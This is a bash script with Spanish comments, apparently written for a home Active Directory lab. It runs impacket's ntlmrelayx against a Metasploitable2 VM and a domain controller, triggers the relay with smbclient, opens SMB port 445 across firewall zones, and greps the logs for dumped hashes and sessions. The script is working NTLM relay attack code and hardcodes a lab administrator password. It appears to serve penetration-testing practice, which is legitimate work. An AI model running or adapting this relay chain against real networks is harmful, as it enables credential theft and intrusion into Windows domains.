#!/usr/bin/env bash
# =============================================================================
# SUITE AD REAL — ROUND 7 (relay win, listener primero, zonas todas)
# =============================================================================
set -u
DC=192.168.122.50
ADMIN='Administrator'
ADMPW='TarsLab2026!'
VENV=/opt/ad-tools-venv/bin
OUT=/opt/ad-lab/evidence/suite-ad-real-20260809
HOST_IP=192.168.122.1
TS(){ date +%H:%M:%S; }
echo "[$(TS)] ============ ROUND 7 START ============"

echo "[$(TS)] === R7.0 zonas ==="
firewall-cmd --get-active-zones 2>&1 | tee "$OUT/08b-firewall.txt"
for z in libvirt FedoraWorkstation public trusted; do
  firewall-cmd --zone=$z --add-port=445/tcp >/dev/null 2>&1
done
firewall-cmd --list-all --zone=libvirt 2>&1 | grep -E "ports|interfaces" | tee -a "$OUT/08b-firewall.txt"

# boot metasploitable2
virsh list --all | grep -q "metasploitable2.*running" || virsh start metasploitable2 2>&1 | head -2
META_IP=""
for i in $(seq 1 18); do
  sleep 10
  META_IP=$(virsh net-dhcp-leases default 2>/dev/null | awk '{print $5}' | grep -oE '192\.168\.122\.[0-9]+' | grep -vE '^192\.168\.122\.(50|151)$' | head -1)
  [ -n "$META_IP" ] && break
done
echo "[$(TS)] metasploitable2 IP=${META_IP:-NONE}"
echo "${META_IP:-NONE}" > "$OUT/08a-meta-ip.txt"
[ -n "$META_IP" ] && timeout 15 $VENV/nxc smb "$META_IP" -u '' -p '' --shares 2>&1 | tee "$OUT/08a-meta-anon-shares.txt"

echo "[$(TS)] === R7.1 RELAY WIN: listener primero, luego trigger ==="
$VENV/ntlmrelayx.py -ip $HOST_IP --no-http-server -t "smb://$META_IP" -smb2support -l "$OUT/relay-loot-meta" >"$OUT/08-relayx-meta.log" 2>&1 &
RELAYPID=$!
sleep 8
echo "[$(TS)] --- listener check:" | tee -a "$OUT/08b-firewall.txt"
ss -ltnp 2>/dev/null | grep ':445 ' | tee -a "$OUT/08b-firewall.txt" || echo "445 NO LISTENING" >> "$OUT/08b-firewall.txt"
nc -zvw2 $HOST_IP 445 2>&1 | tee -a "$OUT/08b-firewall.txt"
echo "[$(TS)] --- trigger:"
timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08c-trigger-smbclient.txt"
sleep 15
kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
grep -iE "authenticated|dumping|sam|share|nt_status|session|attempting|error|wrote|smb-|target|hash|relay" "$OUT/08-relayx-meta.log" | head -40 | tee "$OUT/08d-relay-meta-result.txt"
ls -la "$OUT/relay-loot-meta/" 2>/dev/null | head -8 | tee -a "$OUT/08d-relay-meta-result.txt"

echo "[$(TS)] === R7.2 relay -> DC SMB (signing) ==="
$VENV/ntlmrelayx.py -ip $HOST_IP --no-http-server -t "smb://$DC" -smb2support -l "$OUT/relay-loot-dcsmb" >"$OUT/08-relayx-dcsmb.log" 2>&1 &
RELAYPID=$!
sleep 8
timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08h-trigger-dcsmb.txt"
sleep 15
kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
grep -iE "authenticated|dumping|sam|nt_status|session|attempting|error|signing|refus|accept|target|smb-|hash|relay" "$OUT/08-relayx-dcsmb.log" | head -25 | tee "$OUT/08i-relay-dcsmb-result.txt"

echo "[$(TS)] === R7.3 cleanup ==="
for z in libvirt FedoraWorkstation public trusted; do firewall-cmd --zone=$z --remove-port=445/tcp >/dev/null 2>&1; done
virsh shutdown metasploitable2 2>&1 | head -1
echo "[$(TS)] ============ ROUND 7 DONE ============"
